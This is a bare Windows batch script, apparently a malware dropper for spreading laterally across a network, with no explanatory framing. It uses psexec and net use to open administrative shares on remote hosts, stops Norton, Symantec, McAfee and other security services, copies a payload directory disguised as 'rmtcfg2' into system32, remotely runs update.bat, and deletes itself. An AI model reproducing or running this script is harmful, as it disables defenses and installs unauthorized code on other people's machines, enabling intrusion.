   net use x: /delete
   net use \\ /USER:
   psexec \\ -u -p net share C$
   psexec \\ -u -p net share ADMIN$
   psexec \\ -u -p net share IPC$
   net use x: \\\C$
   psexec \\ -u -p net stop "Norton AntiVirus Server"
   psexec \\ -u -p net stop "Norton AntiVirus Auto Protect Service"
   psexec \\ -u -p net stop "Norton AntiVirus Client"
   psexec \\ -u -p net stop "Symantec AntiVirus Client"
   psexec \\ -u -p net stop "Security Accounts Manager"
   psexec \\ -u -p net stop "McShield"
   psexec \\ -u -p net stop "IPSEC Policy Agent"
   psexec \\ -u -p net stop "DefWatch"
   psexec \\ -u -p net stop "TCP/IP NetBIOS Helper Service"
   mkdir x:\winnt\system32\rmtcfg2
   copy copy\* x:\winnt\system32\rmtcfg2
   mkdir x:\winnt\system32\rmtcfg2
   mkdir x:\winnt\system32\rmtcfg2\dat
   mkdir x:\winnt\system32\rmtcfg2\log
   mkdir x:\winnt\system32\rmtcfg2\plugin
   copy C:\WINNT\SYSTEM32\rmtcfg2\* x:\winnt\system32\rmtcfg2
   copy plugin\* x:\winnt\system32\rmtcfg2\plugin
   copy dat\* x:\winnt\system32\rmtcfg2\dat
   psexec \\ -u -p -d c:\winnt\system32\rmtcfg2\update.bat
   net use x: /delete
   net use \\ /delete
   del runme133447.bat
